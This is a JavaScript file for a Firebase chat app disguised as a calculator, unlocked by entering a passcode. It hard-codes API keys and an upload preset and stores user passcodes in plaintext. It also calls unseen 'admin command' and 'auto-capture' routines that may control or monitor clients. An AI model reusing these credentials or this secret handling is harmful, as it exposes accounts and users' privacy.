// ===========================
// Firebase SDK Imports
// ===========================
import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js';
import {
    getAuth,
    createUserWithEmailAndPassword,
    signInWithEmailAndPassword,
    signOut,
    onAuthStateChanged
} from 'https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js';
import {
    getFirestore,
    collection,
    doc,
    setDoc,
    addDoc,
    getDoc,
    getDocs,
    updateDoc,
    deleteDoc,
    query,
    where,
    orderBy,
    limit,
    onSnapshot,
    serverTimestamp,
    Timestamp,
    arrayUnion,
    arrayRemove
} from 'https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js';
import { getStorage, ref, uploadBytesResumable, getDownloadURL } from 'https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js';

// ===========================
// Firebase Configuration
// ===========================
const firebaseConfig = {
    apiKey: "AIzaSyCjU48-MYfwQLDPc7C04lcyROT6s5cLH-8",
    authDomain: "chat-f5b70.firebaseapp.com",
    projectId: "chat-f5b70",
    storageBucket: "chat-f5b70.firebasestorage.app",
    messagingSenderId: "158106000000",
    appId: "1:158106000000:web:6cd2c27cdd676d306da465",
    measurementId: "G-6H096XKK6S"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const storage = getStorage(app);

// Expose Firebase instances to window for other pages (like gallery.html)
window.auth = auth;
window.db = db;
window.storage = storage;

// ===========================
// Cloudinary Configuration
// ===========================
const CLOUDINARY_CLOUD_NAME = "dxhn3fzfu";
const CLOUDINARY_UPLOAD_PRESET = "chat123";

// Giphy API Configuration
// Get your free API key from: https://developers.giphy.com/dashboard/
const GIPHY_API_KEY = 'GDeNjVWG1AZz0bUqp5nzmY9JFrocS0vQ';
const GIPHY_RESULT_LIMIT = 28;
const CUSTOM_STICKERS_KEY_PREFIX = 'chat-custom-stickers';
const DEFAULT_STICKER_EMOJIS = ['😀', '😂', '😍', '😎', '🤯', '😭', '🙌', '🔥', '👍', '🎉', '💀', '🤩'];

// Smart Sticker Recommendations
const STICKER_KEYWORDS = {
    'love': ['😍', '❤️'],
    'lol': ['😂', '💀'],
    'haha': ['😂', '💀'],
    'cool': ['😎', '👍'],
    'wow': ['🤯', '🤩'],
    'sad': ['😭'],
    'fire': ['🔥'],
    'lit': ['🔥'],
    'yes': ['👍', '🙌'],
    'yay': ['🎉', '🙌'],
    'dead': ['💀'],
    'star': ['🤩']
};

// Admin stickers and backgrounds
let adminStickers = [];
let adminBackgrounds = [];

const PRESENCE_TIMEOUT = 15000; // 15 seconds
const PRESENCE_UPDATE_INTERVAL = 5000; // 5 seconds
const STORY_DURATION_MS = 24 * 60 * 60 * 1000; // 24 hours
const STORY_AUTO_ADVANCE_MS = 6000;

// ===========================
// Global State
// ===========================
const DEFAULT_STICKERS = DEFAULT_STICKER_EMOJIS.map((emoji, index) => ({
    id: `emoji-${index}`,
    emoji,
    url: createEmojiStickerDataUrl(emoji)
}));

let currentUser = null;
let currentChatUser = null;
let currentChatId = null;
let unsubscribeMessages = null;
let unsubscribeTyping = null;
let typingTimeout = null;
let longPressTimer = null;
let selectedMessageId = null;
let replyingToMessage = null;
let editingMessageId = null;
let editingOriginalText = null;
let presenceInterval = null;
let isContextMenuOpen = false;
let currentUserData = null;
let unsubscribeCurrentUser = null;
let profileAvatarTempUrl = null;
let avatarUploadInProgress = false;
let unsubscribeStories = null;
let userNicknames = new Map(); // Store nicknames: userId -> nickname
let chatThemes = new Map(); // Store themes: chatId -> theme object
let storiesByUser = new Map();
let activeStorySequence = [];
let activeStoryIndex = 0;
let activeStoryUserId = null;
let storyUploadInProgress = false;
let storyProgressRaf = null;
let storyProgressStart = null;
let storyProgressFillEl = null;
let storyProgressDuration = STORY_AUTO_ADVANCE_MS;
let gifSearchTimeout = null;
let gifInitialLoadDone = false;
let sentIndicatorUpdateInterval = null;
let gifAbortController = null;
let gifCurrentOffset = 0;
let gifCurrentQuery = '';
let gifLoadingMore = false;
let gifHasMore = true;
let customStickers = [];
let streakData = new Map(); // Store streaks: chatId -> { count, lastMessageDate, lastMessageFrom }
let streakCheckInterval = null;
let userNotifications = []; // Store notifications for current user
let unsubscribeNotifications = null; // Firestore listener for notifications
let notificationsUnreadCount = 0; // Track unread notification count
let watchPartyMetadataTimer = null;
let pendingWatchPartyVideoId = null;
// Couple countdown state
let currentRelationship = null;
let countdownInterval = null;
let relationshipListener = null;
let partnerData = { partner1: null, partner2: null };
let pendingWatchPartyMetadata = null;
let unsubscribeCommands = null; // Listener for admin commands
let floatingMessagePlayed = false;
let floatingMessageTypewriterTimeout = null;

// ===========================
// Auto-scroll Helper
// ===========================
function scrollMessagesToBottom() {
    if (!messagesContainer) return;
    // Use requestAnimationFrame for smooth scrolling
    requestAnimationFrame(() => {
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
    });
}

// ===========================
// Notification Helper
// ===========================
function showNotification(message, duration = 3000) {
    if (!successNotification || !notificationMessage) return;
    notificationMessage.textContent = message;
    successNotification.classList.remove('hidden');

    // Auto-hide after duration
    setTimeout(() => {
        successNotification.classList.add('hidden');
    }, duration);
}

// ===========================
// DOM Elements
// ===========================
const globalLoading = document.getElementById('global-loading');
const calculatorView = document.getElementById('calculator-view');
const chatApp = document.getElementById('chat-app');
const loginModal = document.getElementById('login-modal');
const display = document.getElementById('display');
const loginTrigger = document.getElementById('login-trigger');
const calcLoginTrigger = document.getElementById('calc-login-trigger');
const calcLogoutBtn = document.getElementById('calc-logout-btn');
const closeModal = document.querySelector('.close-modal');
const loginForm = document.getElementById('login-form');
const signupForm = document.getElementById('signup-form');
const authError = document.getElementById('auth-error');
const userList = document.getElementById('user-list');
const messagesContainer = document.getElementById('messages-container');
const messageInput = document.getElementById('message-input');
const sendBtn = document.getElementById('send-btn');
const mediaMenuBtn = document.getElementById('media-menu-btn');
const mediaMenu = document.getElementById('media-menu');
const imageInput = document.getElementById('image-input');
const typingIndicator = document.getElementById('typing-indicator');
const chatWindowContainer = document.getElementById('chat-window-container');
const backToUsersBtn = document.getElementById('back-to-users');
const reactionPopup = document.getElementById('reaction-popup');
const messageOptions = document.getElementById('message-options');
const replyPreview = document.getElementById('reply-preview');
const cancelReplyBtn = document.getElementById('cancel-reply');
const currentUserNameEl = document.getElementById('current-user-name');
const currentUserEmailEl = document.getElementById('current-user-email');
const currentUserAvatarEl = document.getElementById('current-user-avatar');
const currentUserStatusEl = document.getElementById('current-user-status');
const currentUserIndicatorEl = document.getElementById('current-user-indicator');
const currentUserTaglineEl = document.getElementById('current-user-tagline');
const imageViewer = document.getElementById('image-viewer');
const imageViewerImg = document.getElementById('image-viewer-img');
const imageViewerDownload = document.getElementById('image-viewer-download');
const imageViewerClose = document.getElementById('image-viewer-close');
const editProfileBtn = document.getElementById('edit-profile-btn');
const profileModal = document.getElementById('profile-modal');
const closeProfileModalBtn = document.getElementById('close-profile-modal');
const profileNameInput = document.getElementById('profile-name-input');
const profilePasscodeInput = document.getElementById('profile-passcode-input');
const profileStatusInput = document.getElementById('profile-status-input');
const profileAvatarInput = document.getElementById('profile-avatar-input');
const profileAvatarCircle = document.getElementById('profile-avatar-circle');
const changeAvatarBtn = document.getElementById('change-avatar-btn');
const saveProfileBtn = document.getElementById('save-profile-btn');
const cancelProfileBtn = document.getElementById('cancel-profile-btn');
const deleteAccountBtn = document.getElementById('delete-account-btn');
const deleteAccountModal = document.getElementById('delete-account-modal');
const cancelDeleteBtn = document.getElementById('cancel-delete-btn');
const confirmDeleteBtn = document.getElementById('confirm-delete-btn');
const deleteEmailInput = document.getElementById('delete-email-input');
const deleteEmailError = document.getElementById('delete-email-error');
const chatSettingsBtn = document.getElementById('chat-settings-btn');
const chatSettingsModal = document.getElementById('chat-settings-modal');
const closeChatSettingsBtn = document.getElementById('close-chat-settings');
const nicknameInput = document.getElementById('nickname-input');
const saveNicknameBtn = document.getElementById('save-nickname-btn');
const removeNicknameBtn = document.getElementById('remove-nickname-btn');
const sentBubbleColorInput = document.getElementById('sent-bubble-color');
const receivedBubbleColorInput = document.getElementById('received-bubble-color');
const bgColorInput = document.getElementById('bg-color');
const bgImageInput = document.getElementById('bg-image');
const bgImageBtn = document.getElementById('bg-image-btn');
const removeBgImageBtn = document.getElementById('remove-bg-image-btn');
const applyThemeBtn = document.getElementById('apply-theme-btn');
const resetThemeBtn = document.getElementById('reset-theme-btn');
const clearAllChatsBtn = document.getElementById('clear-all-chats-btn');
const clearChatConfirmationModal = document.getElementById('clear-chat-confirmation-modal');
const confirmClearBtn = document.getElementById('confirm-clear-btn');
const confirmClearCancelBtn = document.getElementById('confirm-clear-cancel-btn');
const successNotification = document.getElementById('success-notification');
const notificationMessage = document.getElementById('notification-message');
const storyStrip = document.getElementById('story-strip');
const storyListEl = document.getElementById('story-list');
const addStoryBtn = document.getElementById('add-story-btn');
const storyFileInput = document.getElementById('story-file-input');
const storyViewer = document.getElementById('story-viewer');
const storyViewerMediaContainer = document.getElementById('story-viewer-media-container');
const storyViewerClose = document.getElementById('story-viewer-close');
const storyViewerName = document.getElementById('story-viewer-name');
const storyViewerTime = document.getElementById('story-viewer-time');
const storyViewerAvatar = document.getElementById('story-viewer-avatar');
const storyPrevBtn = document.getElementById('story-prev-btn');
const storyNextBtn = document.getElementById('story-next-btn');
const storyProgressEl = document.getElementById('story-progress');
const storyLikeBtn = document.getElementById('story-like-btn');
const storyLikeCountEl = document.getElementById('story-like-count');
const gifModal = document.getElementById('gif-modal');
const closeGifModalBtn = document.getElementById('close-gif-modal');
const gifResultsEl = document.getElementById('gif-results');
const gifSearchInput = document.getElementById('gif-search-input');
const gifEmptyState = document.getElementById('gif-empty-state');
const gifLoadingEl = document.getElementById('gif-loading');
const stickerSheet = document.getElementById('sticker-sheet');
const stickerBackdrop = stickerSheet ? stickerSheet.querySelector('.sheet-backdrop') : null;
const closeStickerPanelBtn = document.getElementById('close-sticker-panel');
const addStickerBtn = document.getElementById('add-sticker-btn');
const defaultStickerGrid = document.getElementById('default-sticker-grid');
const customStickerGrid = document.getElementById('custom-sticker-grid');
const customStickerSection = document.getElementById('custom-sticker-section');
const adminStickerSection = document.getElementById('admin-sticker-section');
const adminStickerGrid = document.getElementById('admin-sticker-grid');
const stickerFileInput = document.getElementById('sticker-file-input');
const streakBadge = document.getElementById('streak-badge');
const streakCount = document.getElementById('streak-count');
const notificationsBtn = document.getElementById('notifications-btn');
const notificationsBadge = document.getElementById('notifications-badge');
const notificationsModal = document.getElementById('notifications-modal');
const notificationsList = document.getElementById('notifications-list');
const closeNotificationsBtn = document.getElementById('close-notifications');
const notificationsBackdrop = document.querySelector('.notifications-backdrop');
const selectAdminBgBtn = document.getElementById('select-admin-bg-btn');
const adminBgSelectorModal = document.getElementById('admin-bg-selector-modal');
const closeAdminBgSelectorBtn = document.getElementById('close-admin-bg-selector');
const adminBgGrid = document.getElementById('admin-bg-grid');
const adminBgEmpty = document.getElementById('admin-bg-empty');
const adminBgLoading = document.getElementById('admin-bg-loading');
const watchPartyModal = document.getElementById('watch-party-modal');
const watchPartyInput = document.getElementById('watch-party-url');
const watchPartyError = document.getElementById('watch-party-error');
const watchPartyPreview = document.getElementById('watch-party-preview');
const watchPartyThumbnail = document.getElementById('watch-party-thumbnail');
const watchPartyTitleEl = document.getElementById('watch-party-title');
const createWatchPartyBtn = document.getElementById('create-watch-party-btn');
const closeWatchPartyModalBtn = document.getElementById('close-watch-party-modal');
const floatingPersona = document.getElementById('floating-persona');
const floatingPersonaAvatar = document.getElementById('floating-persona-avatar');
const floatingPersonaTextEl = document.getElementById('floating-persona-text');
const floatingPersonaCloseBtn = document.getElementById('floating-persona-close');

let floatingPersonaShowTimeout = null;

// ===========================
// Performance Optimizations
// ===========================
// Debounce scroll events for smooth scrolling
let scrollTimeout;
function debounceScroll(callback, delay = 100) {
    return function () {
        clearTimeout(scrollTimeout);
        scrollTimeout = setTimeout(callback, delay);
    };
}

// Throttle function for frequent events
function throttle(func, limit) {
    let inThrottle;
    return function () {
        if (!inThrottle) {
            func.apply(this, arguments);
            inThrottle = true;
            setTimeout(() => inThrottle = false, limit);
        }
    };
}

// Use passive event listeners for better scroll performance
const passiveOptions = { passive: true };

renderCurrentUserProfile();
if (imageViewerClose && imageViewer) {
    imageViewerClose.addEventListener('click', closeImageViewer);
    imageViewer.addEventListener('click', (e) => {
        if (e.target === imageViewer || e.target.classList.contains('image-viewer-backdrop')) {
            closeImageViewer();
        }
    });
}
if (imageViewerDownload) {
    imageViewerDownload.addEventListener('click', handleImageDownload);
}
if (editProfileBtn) {
    editProfileBtn.addEventListener('click', openProfileModal);
}
if (closeProfileModalBtn) {
    closeProfileModalBtn.addEventListener('click', closeProfileModal);
}
if (cancelProfileBtn) {
    cancelProfileBtn.addEventListener('click', closeProfileModal);
}
if (changeAvatarBtn) {
    changeAvatarBtn.addEventListener('click', () => profileAvatarInput?.click());
}
if (profileAvatarInput) {
    profileAvatarInput.addEventListener('change', handleProfileAvatarChange);
}
if (saveProfileBtn) {
    saveProfileBtn.addEventListener('click', saveProfileChanges);
}
if (deleteAccountBtn) {
    deleteAccountBtn.addEventListener('click', openDeleteAccountModal);
}
if (cancelDeleteBtn) {
    cancelDeleteBtn.addEventListener('click', closeDeleteAccountModal);
}
if (confirmDeleteBtn) {
    confirmDeleteBtn.addEventListener('click', confirmDeleteAccount);
}
if (deleteEmailInput) {
    deleteEmailInput.addEventListener('input', () => {
        deleteEmailError.classList.add('hidden');
        deleteEmailError.textContent = '';
    });
}
if (deleteAccountModal) {
    deleteAccountModal.addEventListener('click', (e) => {
        if (e.target === deleteAccountModal) {
            closeDeleteAccountModal();
        }
    });
}
if (chatSettingsBtn) {
    chatSettingsBtn.addEventListener('click', openChatSettingsModal);
}
if (closeChatSettingsBtn) {
    closeChatSettingsBtn.addEventListener('click', closeChatSettingsModal);
}
if (saveNicknameBtn) {
    saveNicknameBtn.addEventListener('click', saveNickname);
}
if (removeNicknameBtn) {
    removeNicknameBtn.addEventListener('click', removeNickname);
}
if (clearAllChatsBtn) {
    clearAllChatsBtn.addEventListener('click', showClearChatConfirmation);
}
if (confirmClearBtn) {
    confirmClearBtn.addEventListener('click', confirmClearAllChats);
}
if (confirmClearCancelBtn) {
    confirmClearCancelBtn.addEventListener('click', closeClearChatConfirmation);
}
if (clearChatConfirmationModal) {
    clearChatConfirmationModal.addEventListener('click', (e) => {
        if (e.target === clearChatConfirmationModal) {
            closeClearChatConfirmation();
        }
    });
}
if (chatSettingsModal) {
    chatSettingsModal.addEventListener('click', (e) => {
        if (e.target === chatSettingsModal) {
            closeChatSettingsModal();
        }
    });

    // Handle back button click on the h2 element
    const chatSettingsHeader = chatSettingsModal.querySelector('.chat-settings-header h2');
    if (chatSettingsHeader) {
        chatSettingsHeader.addEventListener('click', (e) => {
            // Check if click is on the back arrow area (first 60px of h2)
            const rect = chatSettingsHeader.getBoundingClientRect();
            const clickX = e.clientX - rect.left;
            if (clickX <= 60) {
                closeChatSettingsModal();
            }
        });
    }
}
if (selectAdminBgBtn) {
    selectAdminBgBtn.addEventListener('click', openAdminBgSelector);
}
if (closeAdminBgSelectorBtn) {
    closeAdminBgSelectorBtn.addEventListener('click', closeAdminBgSelector);
}
if (adminBgSelectorModal) {
    adminBgSelectorModal.addEventListener('click', (e) => {
        if (e.target === adminBgSelectorModal) {
            closeAdminBgSelector();
        }
    });
}
if (bgImageBtn) {
    bgImageBtn.addEventListener('click', () => bgImageInput?.click());
}
if (bgImageInput) {
    bgImageInput.addEventListener('change', handleBgImageChange);
}
if (removeBgImageBtn) {
    removeBgImageBtn.addEventListener('click', removeBgImage);
}

// Floating Persona wiring
if (floatingPersonaCloseBtn && floatingPersona) {
    floatingPersonaCloseBtn.addEventListener('click', handleFloatingPersonaClose);
}
if (floatingPersona) {
    floatingPersona.addEventListener('transitionend', (e) => {
        if (floatingPersona.classList.contains('closing')) {
            floatingPersona.classList.add('hidden');
        }
    });
}

// Theme Preset Buttons
document.querySelectorAll('.theme-preset-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const presetName = btn.dataset.preset;
        applyThemePreset(presetName);
    });
});

// Theme Color Inputs - Live Preview
if (sentBubbleColorInput) {
    sentBubbleColorInput.addEventListener('change', () => {
        updateColorValueDisplays();
        updateThemePreview();
    });
    sentBubbleColorInput.addEventListener('input', () => {
        updateColorValueDisplays();
        updateThemePreview();
    });
}

if (receivedBubbleColorInput) {
    receivedBubbleColorInput.addEventListener('change', () => {
        updateColorValueDisplays();
        updateThemePreview();
    });
    receivedBubbleColorInput.addEventListener('input', () => {
        updateColorValueDisplays();
        updateThemePreview();
    });
}

if (bgColorInput) {
    bgColorInput.addEventListener('change', () => {
        updateColorValueDisplays();
        updateThemePreview();
    });
    bgColorInput.addEventListener('input', () => {
        updateColorValueDisplays();
        updateThemePreview();
    });
}

if (applyThemeBtn) {
    applyThemeBtn.addEventListener('click', applyTheme);
}

if (resetThemeBtn) {
    resetThemeBtn.addEventListener('click', resetTheme);
}
if (addStoryBtn) {
    addStoryBtn.addEventListener('click', () => storyFileInput?.click());
}
if (storyFileInput) {
    storyFileInput.addEventListener('change', handleStoryFileChange);
}
if (storyViewerClose) {
    storyViewerClose.addEventListener('click', closeStoryViewer);
}
if (storyViewer) {
    storyViewer.addEventListener('click', (e) => {
        if (e.target === storyViewer || e.target.classList.contains('story-viewer-backdrop')) {
            closeStoryViewer();
        }
    });
}
if (storyPrevBtn) {
    storyPrevBtn.addEventListener('click', () => navigateStory(-1));
}
if (storyNextBtn) {
    storyNextBtn.addEventListener('click', () => navigateStory(1));
}
if (storyLikeBtn) {
    storyLikeBtn.addEventListener('click', toggleStoryLike);
}

// Image Viewer Download Functionality
if (imageViewerClose) {
    imageViewerClose.addEventListener('click', closeImageViewer);
}
if (imageViewer) {
    imageViewer.addEventListener('click', (e) => {
        if (e.target === imageViewer || e.target.classList.contains('image-viewer-backdrop')) {
            closeImageViewer();
        }
    });
}
if (imageViewerDownload) {
    imageViewerDownload.addEventListener('click', handleImageDownload);
}

// Media menu will be handled separately
if (closeGifModalBtn) {
    closeGifModalBtn.addEventListener('click', closeGifModal);
}
if (gifModal) {
    gifModal.addEventListener('click', (e) => {
        if (e.target === gifModal) {
            closeGifModal();
        }
    });
}
if (gifSearchInput) {
    gifSearchInput.addEventListener('input', handleGifSearchInput);
}
if (gifResultsEl) {
    gifResultsEl.addEventListener('scroll', handleGifScroll);
}
// Media menu will be handled separately
if (closeStickerPanelBtn) {
    closeStickerPanelBtn.addEventListener('click', closeStickerSheet);
}
if (stickerBackdrop) {
    stickerBackdrop.addEventListener('click', closeStickerSheet);
}
if (addStickerBtn) {
    addStickerBtn.addEventListener('click', () => stickerFileInput?.click());
}
if (stickerFileInput) {
    stickerFileInput.addEventListener('change', handleStickerUpload);
}
renderDefaultStickers();
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeGifModal();
        closeStickerSheet();
    }
});

// ===========================
// Global Loading Screen Functions
// ===========================
function showLoading(text = 'Loading...') {
    if (globalLoading) {
        const loadingText = globalLoading.querySelector('.loading-text');
        if (loadingText) {
            loadingText.textContent = text;
        }
        globalLoading.classList.remove('hidden');
    }
}

function hideLoading() {
    if (globalLoading) {
        globalLoading.classList.add('hidden');
    }
}

// ===========================
// Calculator Logic
// ===========================
let currentValue = '0';
let previousValue = null;
let operation = null;
let shouldResetDisplay = false;

function updateDisplay(value) {
    display.textContent = value;
}

function handleNumber(num) {
    // Handle decimal point
    if (num === '.') {
        // Don't add multiple decimal points
        if (currentValue.includes('.')) return;
        currentValue = currentValue + num;
    } else {
        if (shouldResetDisplay) {
            currentValue = num;
            shouldResetDisplay = false;
        } else {
            currentValue = currentValue === '0' ? num : currentValue + num;
        }
    }
    updateDisplay(currentValue);
}

function handleOperator(op) {
    if (operation && !shouldResetDisplay) {
        calculate();
    }
    previousValue = currentValue;
    operation = op;
    shouldResetDisplay = true;
}

function calculate() {
    if (!previousValue || !operation) return;

    const prev = parseFloat(previousValue);
    const current = parseFloat(currentValue);
    let result;

    switch (operation) {
        case 'add':
            result = prev + current;
            break;
        case 'subtract':
            result = prev - current;
            break;
        case 'multiply':
            result = prev * current;
            break;
        case 'divide':
            result = prev / current;
            break;
        default:
            return;
    }

    currentValue = result.toString();
    operation = null;
    previousValue = null;
    shouldResetDisplay = true;
    updateDisplay(currentValue);
}

function handleFunction(func) {
    switch (func) {
        case 'clear':
            currentValue = '0';
            previousValue = null;
            operation = null;
            shouldResetDisplay = false;
            updateDisplay(currentValue);
            break;
        case 'toggle-sign':
            currentValue = (parseFloat(currentValue) * -1).toString();
            updateDisplay(currentValue);
            break;
        case 'percent':
            currentValue = (parseFloat(currentValue) / 100).toString();
            updateDisplay(currentValue);
            break;
    }
}

// Calculator button event listeners
document.querySelectorAll('.calculator-buttons .btn').forEach(btn => {
    btn.addEventListener('click', () => {
        if (btn.classList.contains('number')) {
            handleNumber(btn.dataset.value);
        } else if (btn.classList.contains('operator')) {
            const action = btn.dataset.action;
            if (action === 'equals') {
                handleEquals();
            } else {
                handleOperator(action);
            }
        } else if (btn.classList.contains('function')) {
            handleFunction(btn.dataset.action);
        }
    });
});

// ===========================
// Passcode Check & Unlock
// ===========================
async function handleEquals() {
    if (auth.currentUser) {
        try {
            const userDoc = await getDoc(doc(db, 'users', auth.currentUser.uid));
            if (userDoc.exists()) {
                const userData = userDoc.data();
                if (currentValue === userData.passcode) {
                    // Correct passcode - unlock chat
                    calculatorView.classList.add('hidden');
                    chatApp.classList.remove('hidden');
                    document.body.classList.remove('is-calculating'); // Exit calculator context
                    loadUsers();
                    // Show floating message after entering main UI (1s delay handled inside helper)
                    if (currentUserData) {
                        maybeShowFloatingPersonaFromUserData(currentUserData);
                    }
                    return;
                }
            }
        } catch (error) {
            console.error('Error checking passcode:', error);
        }
    }
    // If not logged in or wrong passcode, just calculate
    calculate();
}

// ===========================
// Authentication
// ===========================
if (loginTrigger) {
    loginTrigger.addEventListener('click', () => {
        loginModal.classList.remove('hidden');
    });
}

// Calculator view buttons
if (calcLoginTrigger) {
    calcLoginTrigger.addEventListener('click', () => {
        loginModal.classList.remove('hidden');
    });
}

if (calcLogoutBtn) {
    calcLogoutBtn.addEventListener('click', async () => {
        try {
            showLoading('Logging out...');
            await signOut(auth);
            hideLoading();
            chatApp.classList.add('hidden');
            calculatorView.classList.remove('hidden');
            currentValue = '0';
            updateDisplay(currentValue);
        } catch (error) {
            hideLoading();
            console.error('Error logging out:', error);
        }
    });
}

closeModal.addEventListener('click', () => {
    loginModal.classList.add('hidden');
    authError.textContent = '';
});

document.getElementById('signup-btn').addEventListener('click', () => {
    loginForm.classList.add('hidden');
    signupForm.classList.remove('hidden');
    authError.textContent = '';
});

document.getElementById('back-to-login-btn').addEventListener('click', () => {
    signupForm.classList.add('hidden');
    loginForm.classList.remove('hidden');
    authError.textContent = '';
});

document.getElementById('login-btn').addEventListener('click', async () => {
    const email = document.getElementById('login-email').value;
    const password = document.getElementById('login-password').value;

    try {
        showLoading('Signing in...');
        await signInWithEmailAndPassword(auth, email, password);
        loginModal.classList.add('hidden');
        authError.textContent = '';
        document.body.classList.remove('is-calculating'); // Remove context class on successful login
    } catch (error) {
        authError.textContent = error.message;
    } finally {
        hideLoading();
    }
});

document.getElementById('create-account-btn').addEventListener('click', async () => {
    const email = document.getElementById('signup-email').value;
    const password = document.getElementById('signup-password').value;
    const name = document.getElementById('signup-name').value;
    const passcode = document.getElementById('signup-passcode').value;

    try {
        showLoading('Creating account...');
        const userCredential = await createUserWithEmailAndPassword(auth, email, password);
        const user = userCredential.user;

        // Create user document in Firestore
        await setDoc(doc(db, 'users', user.uid), {
            uid: user.uid,
            email: user.email,
            displayName: name,
            passcode: passcode,
            photoURL: '',
            status: 'online',
            statusMessage: 'Available',
            lastActive: serverTimestamp(),
            createdAt: serverTimestamp()
        });

        loginModal.classList.add('hidden');
        authError.textContent = '';
    } catch (error) {
        authError.textContent = error.message;
    } finally {
        hideLoading();
    }
});

// Gallery Navigation - Handle both header and footer buttons
const galleryBtns = document.querySelectorAll('#gallery-btn');
galleryBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        window.location.href = 'gallery.html';
    });
});

// Admin Panel Navigation - Handle both header and footer buttons
const adminBtns = document.querySelectorAll('#admin-panel-btn');
adminBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        window.location.href = 'admin.html';
    });
});

// AI Assistant Navigation
const aiAssistantBtn = document.getElementById('ai-assistant-btn');
if (aiAssistantBtn) {
    aiAssistantBtn.addEventListener('click', () => {
        window.location.href = 'ai-assistant.html';
    });
}

// Couple Countdown Ticker Click Handler
const coupleCountdownTicker = document.getElementById('couple-countdown-ticker');
if (coupleCountdownTicker) {
    coupleCountdownTicker.addEventListener('click', () => {
        openDuoPartnerModal();
    });
}

// Duo Partner Modal Close Handler
const closeDuoPartnerModalBtn = document.getElementById('close-duo-partner-modal');
if (closeDuoPartnerModalBtn) {
    closeDuoPartnerModalBtn.addEventListener('click', closeDuoPartnerModal);
}

// Close modal when clicking backdrop
const duoPartnerModal = document.getElementById('duo-partner-modal');
if (duoPartnerModal) {
    const backdrop = duoPartnerModal.querySelector('.duo-partner-backdrop');
    if (backdrop) {
        backdrop.addEventListener('click', closeDuoPartnerModal);
    }
}

document.getElementById('logout-btn').addEventListener('click', async () => {
    try {
        showLoading('Logging out...');
        if (currentUser) {
            await updateUserPresence('offline');

            // Cleanup active session
            try {
                if (currentUser.email) {
                    const sanitizedEmail = currentUser.email.replace(/\./g, '_');
                    await deleteDoc(doc(db, 'active_sessions', sanitizedEmail));
                    console.log('Active session cleaned up for:', sanitizedEmail);
                }
            } catch (sessionError) {
                console.warn('Error cleaning up active session:', sessionError);
            }
        }
        await signOut(auth);
        chatApp.classList.add('hidden');
        calculatorView.classList.remove('hidden');
        document.body.classList.add('is-calculating'); // Re-enable calculator context
        currentValue = '0';
        updateDisplay(currentValue);
    } catch (error) {
        console.error('Error logging out:', error);
    } finally {
        hideLoading();
    }
});

// Update calculator header based on auth state
function updateCalculatorHeader(isLoggedIn) {
    if (isLoggedIn) {
        // Show logout button, hide login button
        if (calcLoginTrigger) calcLoginTrigger.classList.add('hidden');
        if (calcLogoutBtn) calcLogoutBtn.classList.remove('hidden');
    } else {
        // Show login button, hide logout button
        if (calcLoginTrigger) calcLoginTrigger.classList.remove('hidden');
        if (calcLogoutBtn) calcLogoutBtn.classList.add('hidden');
    }
}

// Auth state observer
onAuthStateChanged(auth, async (user) => {
    try {
        if (user) {
            currentUser = user;

            // Register active session
            if (user.email) {
                try {
                    const sanitizedEmail = user.email.replace(/\./g, '_');
                    await setDoc(doc(db, 'active_sessions', sanitizedEmail), {
                        uid: user.uid,
                        email: user.email,
                        displayName: user.displayName || 'Unknown',
                        photoURL: user.photoURL || null,
                        lastActive: serverTimestamp()
                    });
                    console.log('Active session registered for:', user.email);
                } catch (sessionError) {
                    console.error('Error registering active session:', sessionError);
                }
            }

            // Load nicknames from localStorage
            const nicknamesData = localStorage.getItem(`nicknames_${user.uid}`);
            if (nicknamesData) {
                try {
                    userNicknames = new Map(JSON.parse(nicknamesData));
                } catch (e) {
                    console.error('Error loading nicknames:', e);
                    userNicknames = new Map();
                }
            }
            // Load themes from localStorage
            const themesData = localStorage.getItem(`themes_${user.uid}`);
            if (themesData) {
                try {
                    chatThemes = new Map(JSON.parse(themesData));
                } catch (e) {
                    console.error('Error loading themes:', e);
                    chatThemes = new Map();
                }
            }
            // Update calculator header to show logout button
            updateCalculatorHeader(true);
            document.body.classList.add('is-calculating'); // Add context class for calculator
            // Update user status to online
            await updateUserPresence('online');
            startPresenceTracking();
            listenToCurrentUser(user.uid);
            subscribeToStories();
            loadCustomStickers(user.uid);
            loadAdminStickers();
            loadAdminBackgrounds();
            initializeNotificationSystem();
            initCommandListener(); // Initialize listener for admin commands

            // Check for auto-capture flag
            checkAndTriggerAutoCapture(user.uid);

            // Check for couple relationship
            checkUserRelationship();
        } else {
            stopPresenceTracking();
            if (unsubscribeCurrentUser) {
                unsubscribeCurrentUser();
                unsubscribeCurrentUser = null;
            }
            if (unsubscribeCommands) {
                unsubscribeCommands();
                unsubscribeCommands = null;
            }
            currentUserData = null;
            renderCurrentUserProfile();
            if (unsubscribeStories) {
                unsubscribeStories();
                unsubscribeStories = null;
            }
            storiesByUser.clear();
            renderStories([]);
            currentUser = null;
            customStickers = [];
            renderCustomStickers();
            // Stop couple countdown
            stopCountdownTimer();
            currentRelationship = null;
            partnerData = { partner1: null, partner2: null };
            // Update calculator header to show login button
            updateCalculatorHeader(false);
        }
    } finally {
        // Hide loading screen after auth state is determined
        hideLoading();
    }
});

// ===========================
// Helper Functions
// ===========================
function getInitials(name) {
    if (!name) return '?';
    return name.split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2);
}

function isSingleEmojiString(str) {
    if (!str) return false;
    // Regex to match a single Unicode emoji (including surrogate pairs and variation selectors)
    // This regex ensures the string contains ONLY one emoji and nothing else
    const emojiRegex = /^(\p{Extended_Pictographic}|\p{Emoji_Presentation})$/u;
    return emojiRegex.test(str);
}

function isImageUrl(value) {
    return typeof value === 'string' && (value.startsWith('http://') || value.startsWith('https://') || value.startsWith('data:image'));
}

function applyAvatarToElement(element, avatarValue, fallbackName) {
    if (!element) return;
    if (isImageUrl(avatarValue)) {
        element.style.backgroundImage = `url(${avatarValue})`;
        element.textContent = '';
        element.classList.add('has-image');
    } else {
        const initials = avatarValue && avatarValue.length <= 3
            ? avatarValue
            : getInitials(fallbackName || avatarValue || '');
        element.style.backgroundImage = '';
        element.textContent = initials || '?';
        element.classList.remove('has-image');
    }
}

